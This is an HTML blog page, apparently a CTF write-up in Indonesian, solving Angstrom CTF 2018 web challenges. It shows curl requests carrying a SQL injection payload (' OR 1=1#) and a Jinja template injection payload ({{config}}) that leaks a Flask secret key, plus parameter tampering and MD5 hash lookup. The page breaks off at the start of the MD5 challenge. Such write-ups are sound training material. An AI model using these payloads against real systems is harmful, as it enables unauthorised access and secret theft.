@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html>
+<!--
+====================================================
+       _         _ _ _       _            ___ 
+      | |       | (_) |     | |          / __)
+  ____| | _   _ | |_| | ____| | _   ____| |__ 
+ / _  | || \ / || | | |/ _  | || \ / ___)  __)
+( ( | | |_) | (_| | | ( ( | | | | | |   | |   
+ \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
+ 
+====================================================
+@ABDILAHRF
+====================================================
+-->
+<head>
+<meta charset="utf-8">
+<title>ANGSTROM CTF 2018 : WEB CHALLENGES &vert; @ABDILAHRF</title>
+<meta name="description" content="Angstrom CTF 2018 : Web Challenges">
+<meta name="keywords" content="angstromctf">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/images/logo.png">
+<meta name="twitter:title" content="Angstrom CTF 2018 : Web Challenges">
+<meta name="twitter:description" content="Angstrom CTF 2018 : Web Challenges">
+<meta name="twitter:creator" content="@abdilahrf">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Angstrom CTF 2018 : Web Challenges">
+<meta property="og:description" content="Angstrom CTF 2018 : Web Challenges">
+<meta property="og:url" content="http://localhost:4000/ctf/writeup-angstromctf-web-challenges">
+<meta property="og:site_name" content="@abdilahrf">
+<meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/ctf/writeup-angstromctf-web-challenges">
+<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
+<link rel="author" href="https://plus.google.com/?rel=author">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+
+    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">
+
+
+
+
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">
+
+<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
+</head>
+<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  
+
+        <main id="notepad-post-container-simple" class="notepad-post-container-simple" role="main">
+            <header class="notepad-post-header-simple">
+                <div class="notepad-post-menu-header-simple">
+
+                    <a class="notepad-blog-logo" href="http://localhost:4000">
+                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
+                    </a>
+
+                <div class="notepad-blog-menu">      
+    <div class="notepad-mobile-menu show-for-small">
+        <a href="#"><i class="fa fa-bars"></i></a>
+    </div>
+    <ul class="notepad-menu">
+        <li class="notepad-mobile-close-btn show-for-small text-right">
+            <a href="#"><i class="fa fa-times"></i></a>
+        </li>
+
+            <li>
+                    <a href="http://localhost:4000/">Home</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/featured">Featured Posts</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/categories">Categories</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/about">About</a>
+                 </li>
+            
+           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
+    </ul>
+
+</div>
+            </div>
+
+                <div class="notepad-post-title-simple row">
+                    <div class="small-12 columns">
+                        <div class="notepad-post-meta-simple">
+                            <h1>Angstrom CTF 2018 : Web Challenges</h1>
+                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#angstromctf" data-toggle="tooltip" title="Posts tagged with angstromctf" rel="tag">angstromctf</a> <strong><time datetime="2018-03-24T00:00:00+07:00">24 Mar 2018</time></strong></p>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+        <article class="notepad-post-content post tag-simple">
+            <div><h3 id="source-me-1">Source Me 1</h3>
+<hr />
+<p>WEB, 20 pts
+There is only one goal: Log in.</p>
+
+<p>Semua informasi yang kita butuhkan untuk login ada pada source htmlnya
+jadi kita tinggal login dengan user admin dan password <code class="highlighter-rouge">f7s0jkl</code></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Source Me 1<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h2&gt;</span>Welcome to the admin portal!<span class="nt">&lt;/h2&gt;</span>
+Currently, only the user who can login is 'admin'.
+<span class="nt">&lt;br&gt;</span>
+<span class="c">&lt;!-- Shh, don't tell anyone. The admin password is f7s0jkl --&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"./login.php"</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
+Username:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name =</span><span class="err"> </span><span class="s">"user"</span><span class="nt">&gt;&lt;br&gt;</span>
+Password:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name =</span><span class="err"> </span><span class="s">"pass"</span><span class="nt">&gt;&lt;br&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://web.angstromctf.com:6999/login.php?user=admin&amp;pass=f7s0jkl
+Welcome, admin. Here is your flag: actf{source_aint_secure}
+</code></pre></div></div>
+
+<h3 id="get-me">GET ME</h3>
+<hr />
+<p>WEB, 30
+Get me! Over here.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"font-size: 18pt; margin: 10% 10% 10% 10%"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;p&gt;</span>
+    Get me! (if you're authorized)
+  <span class="nt">&lt;/p&gt;</span>
+  <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"auth"</span> <span class="na">value=</span><span class="s">"false"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>bisa kita lihat disitu ada form dengan method get dan memiliki field auth
+dengan value false, ketika kita coba untuk submit form tersebut maka akan di dapatkan output</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET =&gt; http://web.angstromctf.com:3005/?auth=false
+Output =&gt; Hey, you're not authorized!
+
+Kita bisa menebak bawha parameter auth adalah boolean yang meiliki false/true
+untuk mendapatkan authorisasi kita bisa mengganti false menjadi true
+
+GET =&gt; http://web.angstromctf.com:3005/?auth=true
+Output =&gt; Here you go: actf{why_did_you_get_me}
+</code></pre></div></div>
+
+<h3 id="sequel">Sequel</h3>
+<hr />
+<p>WEB, 50
+I found what looks like a Star Wars sequel fan club, but I believe the admin user is up to something more nefarious. Can you log in with the admin account and check it out?</p>
+
+<p>Dari nama soalnya yang <code class="highlighter-rouge">Sequel</code> mungkin memberikan kita clue terhadap SQLInjection
+dan memang benar dengan menggunakan payload sederhana seperti <code class="highlighter-rouge">' OR 1=1#</code> pada field username
+dan password kita dapat login dan flag sekaligus :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST http://web2.angstromctf.com:2345/ -d "username=' OR 1=1#<span class="err">&amp;</span>password=' OR 1=1#"
+<span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+        <span class="nt">&lt;head&gt;</span>
+                <span class="nt">&lt;title&gt;</span>Prequel Fan Club<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;/head&gt;</span>
+        <span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background-image: url('images/background2.jpeg');"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h1</span> <span class="na">style=</span><span class="s">"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 4em; color: red; background-color: yellow; font-
+family: sans-serif;"</span><span class="nt">&gt;</span>actf{sql_injection_more_like_prequel_injection}<span class="nt">&lt;/h1&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"images/anakin.jpg"</span><span class="nt">&gt;&lt;/img&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"images/highground.jpg"</span><span class="nt">&gt;&lt;/img&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"images/sand.jpg"</span><span class="nt">&gt;&lt;/img&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"images/ironic.gif"</span><span class="nt">&gt;&lt;/img&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">style=</span><span class="s">'width: 80%;'</span> <span class="na">src=</span><span class="s">"images/prequels.jpg"</span><span class="nt">&gt;&lt;/img&gt;</span>
+        <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>#
+</code></pre></div></div>
+
+<h3 id="source-me-2">Source Me 2</h3>
+<p>WEB, 50
+Your goal hasn’t changed. Log in.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Source Me 2<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h2&gt;</span>Welcome to the admin portal!<span class="nt">&lt;/h2&gt;</span>
+Currently, only the user who can login is 'admin'.
+<span class="nt">&lt;br&gt;</span>
+Username:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id =</span><span class="err"> </span><span class="s">"uname"</span><span class="nt">&gt;&lt;br&gt;</span>
+Password:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id =</span><span class="err"> </span><span class="s">"password"</span><span class="nt">&gt;&lt;br&gt;</span>
+<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"checkLogin()"</span><span class="nt">&gt;</span>Log In<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;h4</span> <span class="na">style=</span><span class="s">"color: red;"</span> <span class="na">id=</span><span class="s">"message"</span><span class="nt">&gt;&lt;/h4&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./md5.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+    <span class="kd">var</span> <span class="nx">checkLogin</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"password"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"uname"</span><span class="p">).</span><span class="nx">value</span> <span class="o">!=</span> <span class="s2">"admin"</span><span class="p">){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uname</span><span class="p">);</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"message"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"Only admin user allowed!"</span><span class="p">;</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">passHash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">passHash</span> <span class="o">==</span> <span class="s2">"bdc87b9c894da5168059e00ebffb9077"</span><span class="p">){</span>
+                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">"./login.php?user=admin&amp;pass="</span> <span class="o">+</span> <span class="nx">password</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"message"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"Incorrect Login"</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Ini adalah lanjutan dari soal source me 1, kali ini dia menggunakan javascript untuk memvalidasi passwordnya
+tapi dia menggunakan hash yang mudah dicari di rainbowtable atau dari google 
+hash yang di gunakan adalah md5 <code class="highlighter-rouge">bdc87b9c894da5168059e00ebffb9077</code> plaintextnya adalah <code class="highlighter-rouge">password1234</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://web.angstromctf.com:7000/login.php?user=admin&amp;pass=password1234
+Welcome, admin. Here is your flag: actf{md5_hash_browns_and_pasta_sauce}
+</code></pre></div></div>
+
+<h3 id="madlibs">MadLibs</h3>
+<hr />
+<p>WEB, 120
+When Ian was a kid, he loved to play goofy Madlibs all day long. Now, he’s decided to write his own website to generate them!</p>
+
+<p>setelah kita melakukan submit ternyata mereka memberikan kita akses source code di <code class="highlighter-rouge">http://web2.angstromctf.com:7777/get-source</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">FileSystemLoader</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">gmtime</span><span class="p">,</span> <span class="n">strftime</span>
+<span class="n">template_dir</span> <span class="o">=</span> <span class="s">'./templates'</span>
+<span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">FileSystemLoader</span><span class="p">(</span><span class="n">template_dir</span><span class="p">))</span>
+
+
+<span class="n">madlib_names</span> <span class="o">=</span> <span class="p">[</span><span class="s">"The Tale of a Person"</span><span class="p">,</span><span class="s">"A Random Story"</span><span class="p">]</span>
+<span class="n">story_fields</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"The Tale of a Person"</span><span class="p">:[</span><span class="s">'Author Name'</span><span class="p">,</span><span class="s">'Adjective'</span><span class="p">,</span><span class="s">'Noun'</span><span class="p">,</span><span class="s">'Verb'</span><span class="p">],</span>
+    <span class="s">"A Random Story"</span><span class="p">:[</span><span class="s">'Author Name'</span><span class="p">,</span><span class="s">'Adjective'</span><span class="p">,</span><span class="s">'Noun'</span><span class="p">,</span><span class="s">'Any first name'</span><span class="p">,</span><span class="s">'Verb'</span><span class="p">]</span>
+    <span class="p">}</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"home.html"</span><span class="p">,</span><span class="n">libs</span><span class="o">=</span><span class="n">madlib_names</span><span class="p">)</span>
+    
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/form/&lt;templatename&gt;"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">madlib</span><span class="p">(</span><span class="n">templatename</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">madlib_names</span>
+    <span class="k">if</span> <span class="n">templatename</span> <span class="ow">in</span> <span class="n">madlib_names</span><span class="p">:</span>  
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"home.html"</span><span class="p">,</span><span class="n">libs</span><span class="o">=</span><span class="n">madlib_names</span><span class="p">,</span><span class="n">title</span><span class="o">=</span><span class="n">templatename</span><span class="p">,</span><span class="n">fields</span><span class="o">=</span><span class="n">story_fields</span><span class="p">[</span><span class="n">templatename</span><span class="p">])</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">error_message</span> <span class="o">=</span> <span class="s">'The MadLib with title "'</span> <span class="o">+</span> <span class="n">templatename</span> <span class="o">+</span> <span class="s">'" could not be found.'</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"home.html"</span><span class="p">,</span><span class="n">libs</span><span class="o">=</span><span class="n">madlib_names</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">error_message</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/result/&lt;templatename&gt;"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">output</span><span class="p">(</span><span class="n">templatename</span><span class="p">):</span>
+    
+    <span class="k">if</span> <span class="n">templatename</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">madlib_names</span><span class="p">:</span>    
+        <span class="k">return</span> <span class="s">"Template not found."</span>
+    
+    <span class="n">inpValues</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">story_fields</span><span class="p">[</span><span class="n">templatename</span><span class="p">])):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)]:</span> 
+            <span class="k">return</span> <span class="s">"All form fields must be filled"</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">inpValues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)][:</span><span class="mi">24</span><span class="p">])</span>
+        
+    <span class="n">authorName</span> <span class="o">=</span> <span class="n">inpValues</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">12</span><span class="p">]</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">comment</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s">'''This MadLib with title </span><span class="si">%</span><span class="s">s was created by </span><span class="si">%</span><span class="s">s at </span><span class="si">%</span><span class="s">s'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">templatename</span><span class="p">,</span> <span class="n">authorName</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">Y-</span><span class="si">%</span><span class="s">m-</span><span class="si">%</span><span class="s">d </span><span class="si">%</span><span class="s">H:</span><span class="si">%</span><span class="s">M:</span><span class="si">%</span><span class="s">S"</span><span class="p">,</span> <span class="n">gmtime</span><span class="p">())))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">comment</span> <span class="o">=</span> <span class="s">"Error generating comment."</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"_"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">templatename</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">())</span><span class="o">+</span><span class="s">".html"</span><span class="p">,</span><span class="n">libtitle</span><span class="o">=</span><span class="n">templatename</span><span class="p">,</span><span class="n">footer</span><span class="o">=</span><span class="n">comment</span><span class="p">,</span> <span class="n">libentries</span><span class="o">=</span><span class="n">inpValues</span><span class="p">)</span>
+    
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/get-source"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span><span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s">'./'</span><span class="p">,</span><span class="s">'app.py'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">7777</span><span class="p">,</span> <span class="n">threaded</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>    
+</code></pre></div></div>
+
+<p>terdapat celah template string pada soal ini lebih tepatnya pada kode berikut</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">comment</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s">'''This MadLib with title </span><span class="si">%</span><span class="s">s was created by </span><span class="si">%</span><span class="s">s at </span><span class="si">%</span><span class="s">s'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">templatename</span><span class="p">,</span> <span class="n">authorName</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">Y-</span><span class="si">%</span><span class="s">m-</span><span class="si">%</span><span class="s">d </span><span class="si">%</span><span class="s">H:</span><span class="si">%</span><span class="s">M:</span><span class="si">%</span><span class="s">S"</span><span class="p">,</span> <span class="n">gmtime</span><span class="p">())))</span>
+</code></pre></div></div>
+
+<p>yang bisa kita kontrol adalah <code class="highlighter-rouge">authorName</code> jadi kita bisa memasukan payload template string kita disitu,
+karena flag nya disimpan pada variable environment <code class="highlighter-rouge">app</code> maka kita bisa menggunakan `` untuk memunculkannya</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 'http://web2.angstromctf.com:7777/result/A%20Random%20Story' -H 'Content-Type: application/x-www-form-urlencoded' --data '1=%7B%7Bconfig%7D%7D&amp;2=x&amp;3=x&amp;4=x&amp;5=x' --compressed
+&lt;!doctype html&gt;
+&lt;title&gt;Angstrom MadLibs&lt;/title&gt;
+
+&lt;body&gt;
+
+&lt;h4&gt;A Random Story&lt;/h4&gt;
+
+&lt;p&gt;
+Once upon a time, there was a very x x named x.
+x liked to x.
+&lt;/p&gt;
+
+&lt;h4&gt;THE END&lt;/h4&gt;
+
+This MadLib with title A Random Story was created by &amp;amp;lt;Config {&amp;amp;#39;DEBUG&amp;amp;#39;: False, &amp;amp;#39;TESTING&amp;amp;#39;: False, &amp;amp;#39;PROPAGATE_EXCEPTI
+ONS&amp;amp;#39;: None, &amp;amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;amp;#39;: None, &amp;amp;#39;SECRET_KEY&amp;amp;#39;: &amp;amp;#39;actf{wow_ur_a_jinja_ninja}&amp;amp;#39;, &amp;amp;#39;P
+ERMANENT_SESSION_LIFETIME&amp;amp;#39;: datetime.timedelta(31), &amp;amp;#39;USE_X_SENDFILE&amp;amp;#39;: False, &amp;amp;#39;LOGGER_NAME&amp;amp;#39;: &amp;amp;#39;__main__&amp;amp;#39;, &amp;
+amp;#39;LOGGER_HANDLER_POLICY&amp;amp;#39;: &amp;amp;#39;always&amp;amp;#39;, &amp;amp;#39;SERVER_NAME&amp;amp;#39;: None, &amp;amp;#39;APPLICATION_ROOT&amp;amp;#39;: None, &amp;amp;#39;SESSION
+_COOKIE_NAME&amp;amp;#39;: &amp;amp;#39;session&amp;amp;#39;, &amp;amp;#39;SESSION_COOKIE_DOMAIN&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_PATH&amp;amp;#39;: None, &amp;amp;#39;SESSION_CO
+OKIE_HTTPONLY&amp;amp;#39;: True, &amp;amp;#39;SESSION_COOKIE_SECURE&amp;amp;#39;: False, &amp;amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;amp;#39;: True, &amp;amp;#39;MAX_CONTENT_LENGTH&amp;a
+mp;#39;: None, &amp;amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;amp;#39;: datetime.timedelta(0, 43200), &amp;amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;amp;#39;: False, &amp;amp;#39;TRAP_HTTP_EX
+CEPTIONS&amp;amp;#39;: False, &amp;amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;amp;#39;: False, &amp;amp;#39;PREFERRED_URL_SCHEME&amp;amp;#39;: &amp;amp;#39;http&amp;amp;#39;, &amp;amp;#39;JSON_AS_ASC
+II&amp;amp;#39;: True, &amp;amp;#39;JSON_SORT_KEYS&amp;amp;#39;: True, &amp;amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;amp;#39;: True, &amp;amp;#39;JSONIFY_MIMETYPE&amp;amp;#39;: &amp;amp;#39;appl
+ication/json&amp;amp;#39;, &amp;amp;#39;TEMPLATES_AUTO_RELOAD&amp;amp;#39;: None}&amp;amp;gt; at 2018-03-24 09:23:03
+&lt;br&gt;&lt;br&gt;
+&lt;a href="/"&gt;Click here to return to the home page.&lt;/a&gt;
+&lt;br&gt;&lt;br&gt;
+MadLib generated using program found &lt;a href="../get-source"&gt;here&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>untuk lebih jelas tentang template string mungkin bisa baca di sini <code class="highlighter-rouge">https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html</code></p>
+
+<h3 id="md5">MD5</h3>
+<p>WEB, 140
+defund’s a true MD5 fan, and he has a site to prove it.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s1">'secret.php'</span><span class="p">;</span>
